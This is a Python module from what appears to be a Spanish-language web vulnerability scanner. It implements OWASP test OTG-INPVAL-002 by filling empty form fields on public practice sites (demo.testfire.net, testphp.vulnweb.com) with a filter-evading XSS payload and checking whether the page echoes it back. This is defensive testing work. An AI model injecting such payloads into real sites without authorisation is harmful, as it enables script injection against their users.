#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from src.lib.obtenerForms import ObtenerForms
from fabrica.otg import OTG
import requests

__otg__ = "OTG-INPVAL-002"

class Inpval_002(OTG):
    def __init__(self, url="", dependencia=None):
        super().__init__(dependencia, __otg__)
        self.urls = ['http://demo.testfire.net/default.aspx',
                'http://demo.testfire.net/bank/login.aspx',
                'http://demo.testfire.net/feedback.aspx',
                'http://demo.testfire.net/survey_questions.aspx']
        self.payload = "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe"

    def obtenerUrls(self):
        pass

    def detectarVulnerabilidad(self, respuesta, form, url):
        ini = respuesta.text.find(self.payload)-150
        fin = respuesta.text.find(self.payload)+150
        pedazo = ""
        i = ini
        while i < fin:
            pedazo += respuesta.text[i]
            i += 1

        if self.payload in respuesta.text:
            msj = "La url '{}' por medio del formulario con acciÃ³n: '{}' es vulnerable a Cross-Site Scripting (XSS).\nEl payload utilizado para esta prueba fue: '{}'\nFragmento de HTML afectado:\n{}".format(url,form.url, self.payload, pedazo)
            print(msj)
            self.adicionarResultado(msj)
    
    def procesarPeticion(self, forms, url):
        session = requests.Session()
        for i in forms:
            newData = dict()
            for k,v in i.data.items():
                if v == "" or v == " ":
                    v = self.payload
                newData.update({k:v})
            if i.type == "post":
                response = session.post(i.url, data=newData)
            else:
                response = session.get(i.url, data=newData)

            self.detectarVulnerabilidad(response, i, url)

    
    def main(self):
        print("================ Inicio prueba OTG-INPVAL-002 ==================\n")

        of = ObtenerForms()
        forms = None
        for i in self.urls:
            forms = of.get_forms(i)
            self.procesarPeticion(forms, i)
        if self.detalles.resultado != "":
            self.adicionarRecomendaciones("")
            self.adicionarRiesgo(0.0)

            self.almacenarBD()

        print("================ Fin prueba OTG-INPVAL-002 ==================\n")
        
"""
urls = ['http://testphp.vulnweb.com/',
        'http://testphp.vulnweb.com/hpp/',
        'http://testphp.vulnweb.com/artists.php',
        'http://testphp.vulnweb.com/guestbook.php',
        'http://testphp.vulnweb.com/categories.php',
        'http://testphp.vulnweb.com/login.php',
        'http://testphp.vulnweb.com/privacy.php',
        'http://testphp.vulnweb.com/cart.php',
        'http://testphp.vulnweb.com/userinfo.php',
        'http://testphp.vulnweb.com/disclaimer.php',
        'http://testphp.vulnweb.com/Mod_Rewrite_Shop',
        'http://testphp.vulnweb.com/AJAX/index.php',
        'http://testphp.vulnweb.com/index.php']

urls = ['http://demo.testfire.net/default.aspx',
        'http://demo.testfire.net/bank/login.aspx',
        'http://demo.testfire.net/feedback.aspx',
        'http://demo.testfire.net/survey_questions.aspx']
"""